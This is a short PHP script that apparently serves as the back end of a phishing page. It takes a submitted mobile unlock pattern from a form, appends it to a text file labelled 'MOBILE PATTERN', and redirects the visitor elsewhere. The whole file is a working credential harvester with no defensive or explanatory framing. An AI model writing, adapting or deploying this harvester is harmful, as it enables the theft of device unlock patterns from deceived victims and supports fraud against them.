<?php
file_put_contents("pattern.txt", "MOBILE PATTERN : "  . $username = $_POST['pattern'] . "\n", FILE_APPEND);
header('Location: redirecturl');
exit();
?>